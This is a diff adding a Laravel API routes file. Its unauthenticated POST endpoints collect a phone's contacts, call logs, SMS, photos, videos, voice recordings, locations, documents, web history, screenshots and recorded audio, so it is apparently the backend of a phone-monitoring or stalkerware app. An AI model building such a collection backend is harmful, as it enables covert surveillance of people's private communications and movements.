@@ -1,0 +1,40 @@
+<?php
+
+use Illuminate\Http\Request;
+
+/*
+|--------------------------------------------------------------------------
+| API Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register API routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| is assigned the "api" middleware group. Enjoy building your API!
+|
+*/
+
+Route::middleware('auth:api')->get('/user', function (Request $request) {
+    return $request->user();
+});
+
+Route::post('contacts', 'API\ContactController@getcontacts');
+Route::post('save-contacts', 'API\ContactController@savecontact');
+
+Route::post('callog', 'API\CallogController@getcallog');
+Route::post('save-calls', 'API\CallogController@savecalls');
+
+Route::post('savesms', 'API\SmsController@savedevicemessage');
+Route::post('user-calendars', 'API\CalendarsController@submit');
+Route::post('wifi-logger', 'API\WifiLoggerController@submit');
+Route::post('user-gallery', 'API\UserGalleryController@userImages');
+Route::post('user-videos', 'API\UserVideosController@userVideos');
+Route::post('user-voices', 'API\UserVoicesController@userVoices');
+Route::post('device-details','API\DeviceDetailController@deviceDetail');
+Route::post('user-applications','API\UserApplicationController@userapplication');
+Route::post('user-locations','API\UserLocationController@userlocations');
+Route::post('user-documents','API\UserDocumentController@user_dacument');
+Route::post('web-history','API\WebHistoryController@web_history');
+Route::post('check-device','API\DeviceDetailController@check_device');
+
+Route::post('store-screenshot','API\StoreScreenshotController@submit_screenshot');
+Route::post('record-audio','API\RecordAudioController@record_audio');
